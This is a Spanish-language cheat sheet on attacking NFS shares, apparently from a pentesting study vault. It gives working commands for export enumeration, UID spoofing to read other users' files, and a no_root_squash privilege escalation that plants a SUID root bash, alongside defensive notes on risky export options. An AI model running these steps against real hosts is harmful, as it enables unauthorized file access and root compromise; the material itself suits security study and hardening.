---
tipo: meta
aliases:
  - NFS - matriz
  - nfs cheatsheet
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# NFS - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puertos: 2049/tcp** (NFS) y **111/tcp+udp** (rpcbind/portmapper, que anuncia dónde está `mountd`). NFS como canal de archivos y vía de escalada: [[MOC - Transferencia de archivos]]. El escaneo mira 111 y 2049.

NFS comparte directorios (*exports*) por red. El control de acceso de NFSv3 es por **UID/GID del cliente** —el server confía en el número que le manda quien monta—, y ahí nace casi todo el ataque.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `rpcinfo -p HOST` | Servicios RPC registrados: ve `nfs`, `mountd`, `portmapper` y sus puertos |
| `showmount -e HOST` | **Los exports** — lo primero que se mira |
| `showmount -a HOST` | Qué cliente tiene montado qué |
| `showmount -d HOST` | Directorios actualmente montados |
| `nmap -sV --script "nfs-ls,nfs-showmount,nfs-statfs" -p 111,2049 HOST` | Exports, listado de archivos y espacio, por script |


## Montar

| Acción | Comando |
|---|---|
| Preparar punto | `mkdir /mnt/nfs` |
| Montar (forzar v3) | `sudo mount -t nfs HOST:/export /mnt/nfs -o vers=3` |
| Sin bloqueo de archivos | `sudo mount -t nfs -o vers=3,nolock HOST:/export /mnt/nfs` |
| Desmontar | `sudo umount /mnt/nfs` |

`vers=3` evita la autenticación más estricta de NFSv4 y suele ser lo que funciona en cajas viejas. Falta `nfs-common` → `mount: wrong fs type`.

## Acceso por UID — leer archivos ajenos

NFSv3 no autentica: cree el UID que el cliente declara. Si un archivo del export pertenece a `uid 1005`:

| Paso | Comando |
|---|---|
| Crear usuario local con ese UID | `sudo useradd -u 1005 victima` |
| Leer como ese UID | `sudo -u victima cat /mnt/nfs/archivo` |

Con root local podés adoptar cualquier UID, así que cualquier archivo del export es legible salvo que el export use `root_squash` + `all_squash`.

## Abuso de `no_root_squash` — escalada a root

La técnica estrella de NFS. Si un export tiene `no_root_squash`, **el root del cliente es root sobre los archivos del export**. Se planta un binario SUID root y se ejecuta en la víctima.

| Paso | Dónde | Comando |
|---|---|---|
| Montar el export | cliente (root) | `mount -t nfs HOST:/export /mnt/x -o vers=3` |
| Copiar una shell | cliente (root) | `cp /bin/bash /mnt/x/rootbash` |
| Dueño root + SUID | cliente (root) | `chown root:root /mnt/x/rootbash && chmod +s /mnt/x/rootbash` |
| Ejecutar en la víctima | víctima (shell de usuario) | `/export/rootbash -p` → `euid=0` |

Requiere `no_root_squash` en el export **y** una shell en la víctima para correr el SUID. Es el equivalente NFS de dejar un binario privilegiado — cruza con la idea de [[MOC - File upload]] (subir algo que luego ejecuta con más privilegio).

## Configuración (con acceso al host)

El archivo de exports y sus opciones peligrosas.

| Archivo | Qué tiene |
|---|---|
| `/etc/exports` | La lista de exports: `/srv/share 10.0.0.0/24(rw,no_root_squash)` |
| `/etc/exports.d/` | Exports adicionales por fragmento |
| `/var/lib/nfs/etab` | Tabla efectiva de lo que se está exportando de verdad |


### Opciones peligrosas en `/etc/exports`

| Opción | Por qué importa |
|---|---|
| `no_root_squash` | Root del cliente = root en el export → SUID a root (arriba) |
| `rw` | Escritura: plantar binarios, pisar archivos |
| `insecure` | Permite montar desde puertos > 1024 → un cliente sin privilegios monta |
| `no_all_squash` | Conserva los UID del cliente → habilita el truco de UID |
| `nohide` | Expone los sistemas de archivos montados **debajo** del export → el cliente cruza a datos no previstos |
| `no_subtree_check` | Menor riesgo, pero afloja la verificación de ruta |

`rw` + `no_root_squash` sobre un export accesible es root casi seguro.

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `access denied by server` | export restringido a otra IP, o UID no autorizado | verificar `showmount -e`, adoptar el UID |
| `mount: wrong fs type` | falta el cliente NFS | instalar `nfs-common` |
| `rpcbind: server not responding` | 111 filtrado o v4-only | `-o vers=3` / `vers=4` según responda |
| `Permission denied` al leer | UID del cliente ≠ dueño del archivo | crear usuario con el UID correcto |
| `showmount` vacío pero 2049 abierto | NFSv4 (no usa mountd) | montar directo `HOST:/` con `vers=4` |

